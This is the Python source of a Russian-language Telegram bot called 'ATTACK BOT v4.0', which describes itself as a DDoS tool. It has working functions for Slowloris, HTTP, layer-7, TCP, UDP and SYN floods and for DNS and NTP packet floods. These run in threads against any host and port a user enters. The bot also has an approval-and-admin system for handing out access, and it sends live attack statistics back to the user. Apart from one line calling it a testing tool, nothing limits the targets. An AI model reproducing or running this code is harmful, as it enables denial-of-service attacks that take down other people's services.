import telebot
import socket
import time
import threading
from threading import Lock, Thread
import random
import os
import logging
from datetime import datetime
import struct
import json

# ==== ЛОГИРОВАНИЕ ====
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("telebot").setLevel(logging.WARNING)

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S',
    handlers=[
        logging.FileHandler('attack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ==== НАСТРОЙКИ ====
TOKEN = ""
bot = telebot.TeleBot(TOKEN, skip_pending=True)

# Главные админы
MAIN_ADMINS = {
    123456789: "admin"
}

# Хранилище данных
users_db = {
    "approved": {},
    "admins": MAIN_ADMINS.copy(),
    "pending": {},
}
db_lock = Lock()

test_running = False
test_results = {
    "total": 0,
    "success": 0,
    "failed": 0,
    "start_time": 0,
    "end_time": 0,
    "method": "",
    "target": "",
    "threads": 0,
}
results_lock = Lock()


# ==== БД ====

def save_db():
    try:
        with open("users_db.json", "w") as f:
            data = {
                "approved": users_db["approved"],
                "admins": users_db["admins"],
                "pending": users_db["pending"]
            }
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Ошибка сохранения БД: {str(e)}")


def load_db():
    global users_db
    try:
        if os.path.exists("users_db.json"):
            with open("users_db.json", "r") as f:
                data = json.load(f)
                users_db["approved"] = {int(k): v for k, v in data.get("approved", {}).items()}
                users_db["admins"] = {int(k): v for k, v in data.get("admins", {}).items()}
                users_db["pending"] = {int(k): v for k, v in data.get("pending", {}).items()}
    except Exception as e:
        logger.error(f"Ошибка загрузки БД: {str(e)}")
    
    for admin_id, admin_name in MAIN_ADMINS.items():
        users_db["admins"][admin_id] = admin_name


def is_approved(user_id: int) -> bool:
    with db_lock:
        return user_id in users_db["approved"] or user_id in users_db["admins"]


def is_admin(user_id: int) -> bool:
    with db_lock:
        return user_id in users_db["admins"]


def log_user_action(user_id: int, username: str, action: str):
    logger.info(f"👤 [{username or 'NoUsername'}] ID:{user_id} - {action}")


def parse_url(url: str):
    url = url.replace('https://', '').replace('http://', '')
    if ':' in url:
        host, rest = url.split(':', 1)
        if '/' in rest:
            port_str, path = rest.split('/', 1)
            port = int(port_str)
            path = '/' + path
        else:
            port = int(rest)
            path = '/'
    else:
        if '/' in url:
            host, path = url.split('/', 1)
            path = '/' + path
        else:
            host = url
            path = '/'
        port = 80
    return host, port, path


# ===== АТАКИ =====

def slowloris_attack(host: str, port: int, thread_id: int = 0) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(5)
        sock.connect((host, port))
        request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n"
        sock.sendall(request.encode())
        for i in range(100):
            if not test_running:
                break
            sock.sendall(f"X-Header-{i}: {random.random()}\r\n".encode())
            time.sleep(0.05)
        sock.close()
        return True
    except:
        return False


def http_flood_pro(host: str, port: int, path: str, thread_id: int = 0) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(2)
        sock.connect((host, port))
        for _ in range(50):
            request = (
                f"GET {path}?q={random.random()} HTTP/1.1\r\n"
                f"Host: {host}\r\nConnection: keep-alive\r\n"
                f"Cache-Control: no-cache\r\nUser-Agent: Mozilla/5.0\r\n"
                f"Accept-Encoding: gzip, deflate\r\n\r\n"
            )
            sock.sendall(request.encode())
        sock.close()
        return True
    except:
        return False


def layer7_attack_pro(host: str, port: int, thread_id: int = 0) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(2)
        sock.connect((host, port))
        payload = "".join([f"param{i}={'A'*100}&" for i in range(50)])
        request = (
            f"POST / HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Cookie: session={random.random()}; admin=1\r\n"
            f"Connection: keep-alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n{payload}"
        )
        sock.sendall(request.encode())
        sock.close()
        return True
    except:
        return False


def tcp_aggressive_pro(host: str, port: int, path: str, thread_id: int = 0) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(1)
        sock.connect((host, port))
        for _ in range(5):
            request = (
                f"GET {path}?r={random.random()} HTTP/1.1\r\n"
                f"Host:{host}\r\nConnection:keep-alive\r\nUser-Agent:Mozilla\r\n\r\n"
            )
            sock.sendall(request.encode())
        sock.close()
        return True
    except:
        return False


def udp_flood_pro(host: str, port: int, thread_id: int = 0) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        payload = os.urandom(8192)
        for _ in range(20):
            try:
                sock.sendto(payload, (host, port))
            except:
                pass
        sock.close()
        return True
    except:
        return False


def syn_flood_simulation(host: str, port: int, thread_id: int = 0) -> bool:
    try:
        for _ in range(10):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(0.1)
                try:
                    sock.connect((host, port))
                except socket.timeout:
                    pass
                sock.close()
            except:
                pass
        return True
    except:
        return False


def amplification_dns(host: str, port: int, thread_id: int = 0) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(2)
        for _ in range(50):
            try:
                dns_id = random.randint(0, 65535)
                header = struct.pack('>HHHHHH', dns_id, 0x0100, 1, 0, 0, 0)
                question = b'\x03www\x07example\x03com\x00\x00\x01\x00\x01'
                sock.sendto(header + question, (host, port))
            except:
                pass
        sock.close()
        return True
    except:
        return False


def ntp_amplification(host: str, port: int, thread_id: int = 0) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(2)
        for _ in range(50):
            try:
                pkt = b'\x17\x00\x03\x2a' + os.urandom(52)
                sock.sendto(pkt, (host, port))
            except:
                pass
        sock.close()
        return True
    except:
        return False


def mixed_attack(host: str, port: int, path: str, thread_id: int = 0) -> bool:
    methods = [slowloris_attack, http_flood_pro, layer7_attack_pro, tcp_aggressive_pro, udp_flood_pro]
    m = random.choice(methods)
    try:
        if m in [udp_flood_pro]:
            return m(host, port, thread_id)
        else:
            return m(host, port, path, thread_id)
    except:
        return False


def worker_attack(host: str, port: int, path: str, method: str, thread_id: int):
    global test_running, test_results
    logger.info(f"▶ Поток #{thread_id} ({method}) запущен")
    while test_running:
        try:
            if method == "slowloris":
                ok = slowloris_attack(host, port, thread_id)
            elif method == "http":
                ok = http_flood_pro(host, port, path, thread_id)
            elif method == "layer7":
                ok = layer7_attack_pro(host, port, thread_id)
            elif method == "tcp2":
                ok = tcp_aggressive_pro(host, port, path, thread_id)
            elif method == "udp":
                ok = udp_flood_pro(host, port, thread_id)
            elif method == "syn":
                ok = syn_flood_simulation(host, port, thread_id)
            elif method == "dns":
                ok = amplification_dns(host, port, thread_id)
            elif method == "ntp":
                ok = ntp_amplification(host, port, thread_id)
            elif method == "mixed":
                ok = mixed_attack(host, port, path, thread_id)
            else:
                ok = False
            with results_lock:
                test_results["total"] += 1
                if ok:
                    test_results["success"] += 1
                else:
                    test_results["failed"] += 1
        except Exception as e:
            logger.error(f"Worker error: {e}")
            with results_lock:
                test_results["total"] += 1
                test_results["failed"] += 1
    logger.info(f"⏹ Поток #{thread_id} остановлен")


def load_test_worker(url: str, duration: int, threads: int, method: str, chat_id: int, username: str):
    global test_running, test_results
    host, port, path = parse_url(url)
    with results_lock:
        test_results = {
            "total": 0, "success": 0, "failed": 0,
            "start_time": time.time(), "end_time": 0,
            "method": method, "target": url, "threads": threads,
        }
    logger.info("=" * 60)
    logger.info(f"АТАКА: {method.upper()} от @{username} на {host}:{port}")
    logger.info("=" * 60)
    bot.send_message(chat_id,
        f"🔥 *АТАКА НАЧАТА*\n\n"
        f"⚡ Метод: `{method.upper()}`\n"
        f"🎯 Цель: `{host}:{port}`\n"
        f"👥 Потоков: {threads}\n"
        f"⏱ Время: {duration} сек",
        parse_mode="Markdown")
    workers = []
    test_running = True
    for i in range(threads):
        t = Thread(target=worker_attack, args=(host, port, path, method, i), daemon=True)
        t.start()
        workers.append(t)
    start = time.time()
    last_msg = 0
    try:
        while test_running and time.time() - start < duration:
            elapsed = time.time() - start
            with results_lock:
                total = test_results["total"]
                ok = test_results["success"]
                bad = test_results["failed"]
            if elapsed - last_msg >= 2 and total > 0:
                rps = total / elapsed
                bot.send_message(chat_id,
                    f"🔥 *АТАКУЕМ*\n\n"
                    f"📦 Всего: `{total}`\n"
                    f"✅ Успешно: `{ok}`\n"
                    f"❌ Ошибок: `{bad}`\n"
                    f"⚡ RPS: `{rps:.0f}/сек`\n"
                    f"⏱ {elapsed:.0f}/{duration} сек",
                    parse_mode="Markdown")
                last_msg = elapsed
            time.sleep(0.05)
    finally:
        test_running = False
        with results_lock:
            test_results["end_time"] = time.time()
        send_final_report(chat_id, username)


def send_final_report(chat_id: int, username: str):
    with results_lock:
        dur = max(0.1, test_results["end_time"] - test_results["start_time"])
        total = test_results["total"]
        ok = test_results["success"]
        bad = test_results["failed"]
        method = test_results["method"]
        target = test_results["target"]
        threads = test_results["threads"]
    rps = total / dur if dur > 0 else 0
    suc_pct = int(ok / max(1, total) * 100)
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("📋 Меню", callback_data="go_menu"))
    kb.add(telebot.types.InlineKeyboardButton("🔄 Новая атака", callback_data="go_menu"))
    text = (
        "╔════════════════════════════════╗\n"
        "║   ✅ АТАКА ЗАВЕРШЕНА ✅        ║\n"
        "╚════════════════════════════════╝\n\n"
        "📊 *СТАТИСТИКА:*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Цель: `{target}`\n"
        f"⚡ Метод: `{method.upper()}`\n"
        f"👥 Потоков: {threads}\n"
        f"📦 Всего: {total}\n"
        f"✅ Успешно: {ok} ({suc_pct}%)\n"
        f"❌ Ошибок: {bad}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱ Время: {dur:.1f} сек\n"
        f"⚡ Скорость: `{rps:.0f}` req/s"
    )
    bot.send_message(chat_id, text, reply_markup=kb, parse_mode="Markdown")


# ===== КОМАНДЫ И ОБРАБОТЧИКИ =====

@bot.message_handler(commands=['start'])
def start_handler(message):
    user_id = message.chat.id
    username = message.from_user.username or "NoUsername"
    log_user_action(user_id, username, "/start")
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("📝 Подать заявку", callback_data="apply_access"))
    kb.add(telebot.types.InlineKeyboardButton("ℹ️ О боте", callback_data="about_bot"))
    if is_approved(user_id):
        kb.add(telebot.types.InlineKeyboardButton("🚀 Меню", callback_data="go_menu"))
        status = "✅ *Доступ открыт*"
    else:
        status = "❌ *Доступ закрыт*"
    if is_admin(user_id):
        kb.add(telebot.types.InlineKeyboardButton("👨‍💼 Админ панель", callback_data="admin_panel"))
    text = (
        "╔════════════════════════════════╗\n"
        "║   🔥 ATTACK BOT v4.0 🔥        ║\n"
        "║   Усиленный DDoS инструмент   ║\n"
        "╚════════════════════════════════╝\n\n"
        f"{status}\n\n"
        "Используй кнопки ниже."
    )
    bot.send_message(user_id, text, reply_markup=kb, parse_mode="Markdown")


@bot.message_handler(commands=['menu'])
def menu_handler(message):
    user_id = message.chat.id
    if not is_approved(user_id):
        bot.reply_to(message, "❌ У тебя нет доступа. Используй /start", parse_mode="Markdown")
        return
    username = message.from_user.username or "NoUsername"
    log_user_action(user_id, username, "/menu")
    send_menu(user_id)


def send_menu(user_id):
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        telebot.types.InlineKeyboardButton("⚡ Slowloris", callback_data="method_slowloris"),
        telebot.types.InlineKeyboardButton("🌊 HTTP Flood", callback_data="method_http"),
        telebot.types.InlineKeyboardButton("🔥 Layer 7", callback_data="method_layer7"),
        telebot.types.InlineKeyboardButton("💥 TCP Flood", callback_data="method_tcp2"),
        telebot.types.InlineKeyboardButton("📦 UDP Flood", callback_data="method_udp"),
        telebot.types.InlineKeyboardButton("🔓 SYN Flood", callback_data="method_syn"),
        telebot.types.InlineKeyboardButton("🌐 DNS Amp", callback_data="method_dns"),
        telebot.types.InlineKeyboardButton("🕐 NTP Amp", callback_data="method_ntp"),
        telebot.types.InlineKeyboardButton("🎲 Mixed", callback_data="method_mixed"),
    )
    if is_admin(user_id):
        kb.add(telebot.types.InlineKeyboardButton("👨‍💼 Админ", callback_data="admin_panel"))
    bot.send_message(user_id,
        "╔════════════════════════════════╗\n"
        "║        📋 ГЛАВНОЕ МЕНЮ        ║\n"
        "╚════════════════════════════════╝\n\n"
        "Выбери метод атаки:",
        reply_markup=kb,
        parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "about_bot")
def about_bot(call):
    username = call.from_user.username or "NoUsername"
    log_user_action(call.message.chat.id, username, "О боте")
    text = (
        "╔════════════════════════════════╗\n"
        "║     ℹ️ О БОТЕ ℹ️               ║\n"
        "╚════════════════════════════════╝\n\n"
        "*ATTACK BOT v4.0*\n\n"
        "Профессиональный инструмент для тестирования защиты серверов.\n\n"
        "*Методы:*\n"
        "⚡ Slowloris | 🌊 HTTP Flood | 🔥 Layer 7\n"
        "💥 TCP Flood | 📦 UDP Flood | 🔓 SYN Flood\n"
        "🌐 DNS Amp | 🕐 NTP Amp | 🎲 Mixed"
    )
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "apply_access")
def apply_access(call):
    user_id = call.message.chat.id
    username = call.from_user.username or "NoUsername"
    if is_approved(user_id):
        bot.send_message(user_id, "✅ *У тебя уже есть доступ!*", parse_mode="Markdown")
        return
    with db_lock:
        if user_id in users_db["pending"]:
            bot.send_message(user_id, "⚠️ *Заявка уже подана*", parse_mode="Markdown")
            return
        users_db["pending"][user_id] = {
            "username": username,
            "first_name": call.from_user.first_name or "Unknown",
            "status": "pending"
        }
        save_db()
    bot.send_message(user_id, "✅ *Заявка отправлена!*\n\nЖди одобрения от админа.", parse_mode="Markdown")
    with db_lock:
        admins = list(users_db["admins"].items())
    for aid, aname in admins:
        try:
            kb = telebot.types.InlineKeyboardMarkup()
            kb.add(
                telebot.types.InlineKeyboardButton("✅ Принять", callback_data=f"approve_{user_id}"),
                telebot.types.InlineKeyboardButton("❌ Отклонить", callback_data=f"reject_{user_id}")
            )
            bot.send_message(aid,
                f"📋 *НОВАЯ ЗАЯВКА*\n\nID: `{user_id}`\nUsername: @{username}\nИмя: {call.from_user.first_name or 'Unknown'}",
                reply_markup=kb,
                parse_mode="Markdown")
        except:
            pass


@bot.callback_query_handler(func=lambda call: call.data.startswith("approve_"))
def approve_user(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет прав", show_alert=True)
        return
    target_id = int(call.data.split("_")[1])
    with db_lock:
        data = users_db["pending"].pop(target_id, None)
        if data:
            users_db["approved"][target_id] = data["username"]
            save_db()
    bot.edit_message_text("✅ *ОДОБРЕНО*", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
    try:
        bot.send_message(target_id, "✅ *ЗАЯВКА ОДОБРЕНА!*\n\nНапиши /menu", parse_mode="Markdown")
    except:
        pass


@bot.callback_query_handler(func=lambda call: call.data.startswith("reject_"))
def reject_user(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет прав", show_alert=True)
        return
    target_id = int(call.data.split("_")[1])
    with db_lock:
        users_db["pending"].pop(target_id, None)
        save_db()
    bot.edit_message_text("❌ *ОТКЛОНЕНО*", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
    try:
        bot.send_message(target_id, "❌ *ЗАЯВКА ОТКЛОНЕНА*", parse_mode="Markdown")
    except:
        pass


@bot.callback_query_handler(func=lambda call: call.data == "admin_panel")
def admin_panel(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет прав", show_alert=True)
        return
    with db_lock:
        pending_cnt = len(users_db["pending"])
        approved_cnt = len(users_db["approved"])
        admins_cnt = len(users_db["admins"])
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton(f"📋 Заявки ({pending_cnt})", callback_data="admin_pending"))
    kb.add(telebot.types.InlineKeyboardButton(f"👤 Одобренные ({approved_cnt})", callback_data="admin_approved"))
    kb.add(telebot.types.InlineKeyboardButton(f"👨‍💼 Админы ({admins_cnt})", callback_data="admin_list"))
    kb.add(telebot.types.InlineKeyboardButton("👥 Выдать админа", callback_data="admin_grant"))
    kb.add(telebot.types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"))
    kb.add(telebot.types.InlineKeyboardButton("🔙 Меню", callback_data="go_menu"))
    bot.send_message(call.message.chat.id,
        "╔════════════════════════════════╗\n"
        "║    👨‍💼 АДМИН ПАНЕЛЬ 👨‍💼       ║\n"
        "╚════════════════════════════════╝",
        reply_markup=kb,
        parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "admin_pending")
def admin_pending(call):
    if not is_admin(call.message.chat.id):
        return
    with db_lock:
        pending = dict(users_db["pending"])
    if not pending:
        bot.send_message(call.message.chat.id, "✅ *Нет заявок*", parse_mode="Markdown")
        return
    for uid, data in pending.items():
        kb = telebot.types.InlineKeyboardMarkup()
        kb.add(
            telebot.types.InlineKeyboardButton("✅ Принять", callback_data=f"approve_{uid}"),
            telebot.types.InlineKeyboardButton("❌ Отклонить", callback_data=f"reject_{uid}")
        )
        text = f"ID: `{uid}`\nUsername: @{data['username']}\nИмя: {data['first_name']}"
        bot.send_message(call.message.chat.id, text, reply_markup=kb, parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "admin_approved")
def admin_approved(call):
    if not is_admin(call.message.chat.id):
        return
    with db_lock:
        approved = dict(users_db["approved"])
    if not approved:
        bot.send_message(call.message.chat.id, "⚪ *Нет одобренных*", parse_mode="Markdown")
        return
    text = "👤 *Одобренные:*\n\n"
    for uid, uname in approved.items():
        text += f"ID: `{uid}` — @{uname}\n"
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "admin_list")
def admin_list(call):
    if not is_admin(call.message.chat.id):
        return
    with db_lock:
        admins = dict(users_db["admins"])
    text = "👨‍💼 *Админы:*\n\n"
    for uid, uname in admins.items():
        text += f"ID: `{uid}` — @{uname}\n"
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "admin_grant")
def admin_grant(call):
    if not is_admin(call.message.chat.id):
        return
    bot.send_message(call.message.chat.id,
        "Отправь ID пользователя:\n`/grantadmin <user_id>`",
        parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "admin_stats")
def admin_stats(call):
    if not is_admin(call.message.chat.id):
        return
    with db_lock:
        a = len(users_db["approved"])
        b = len(users_db["admins"])
        p = len(users_db["pending"])
    text = (
        "📊 *Статистика:*\n\n"
        f"Одобренных: {a}\n"
        f"Админов: {b}\n"
        f"В ожидании: {p}"
    )
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: call.data == "go_menu")
def go_menu(call):
    if not is_approved(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет доступа", show_alert=True)
        return
    send_menu(call.message.chat.id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("method_"))
def method_callback(call):
    if not is_approved(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет доступа", show_alert=True)
        return
    global test_running
    if test_running:
        bot.answer_callback_query(call.id, "⚠️ Атака уже идет", show_alert=True)
        return
    method = call.data.split("_", 1)[1]
    bot.send_message(call.message.chat.id,
        f"⚡ *Метод:* `{method}`\n\n"
        f"Команда:\n`/{method} <host:port> <duration> <threads>`",
        parse_mode="Markdown")


for _method in ["slowloris", "http", "layer7", "tcp2", "udp", "syn", "dns", "ntp", "mixed"]:
    def make_handler(m):
        def handler(message):
            if not is_approved(message.chat.id):
                bot.reply_to(message, "❌ Нет доступа. /start", parse_mode="Markdown")
                return
            global test_running
            if test_running:
                bot.reply_to(message, "⚠️ Атака уже идет", parse_mode="Markdown")
                return
            parts = message.text.split()
            if len(parts) < 4:
                bot.reply_to(message, f"`/{m} <host:port> <duration> <threads>`", parse_mode="Markdown")
                return
            username = message.from_user.username or "NoUsername"
            Thread(target=load_test_worker, args=(parts[1], int(parts[2]), int(parts[3]), m, message.chat.id, username), daemon=True).start()
        return handler
    bot.message_handler(commands=[_method])(make_handler(_method))


@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global test_running
    test_running = False
    bot.reply_to(message, "🛑 *Атака остановлена*", parse_mode="Markdown")


@bot.message_handler(commands=['grantadmin'])
def grant_admin_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "❌ Нет прав", parse_mode="Markdown")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "`/grantadmin <user_id>`", parse_mode="Markdown")
        return
    try:
        target_id = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ ID должен быть числом", parse_mode="Markdown")
        return
    with db_lock:
        if target_id in users_db["admins"]:
            bot.reply_to(message, "⚠️ Уже админ", parse_mode="Markdown")
            return
        uname = users_db["approved"].pop(target_id, f"User_{target_id}") if target_id in users_db["approved"] else f"User_{target_id}"
        users_db["admins"][target_id] = uname
        save_db()
    bot.reply_to(message, f"✅ Админ права выданы ID {target_id}", parse_mode="Markdown")
    try:
        bot.send_message(target_id, "👨‍💼 *Тебе выданы права администратора*", parse_mode="Markdown")
    except:
        pass


if __name__ == "__main__":
    load_db()
    logger.info("🔥 ATTACK BOT v4.0 started")
    bot.infinity_polling(skip_pending=True, timeout=30)
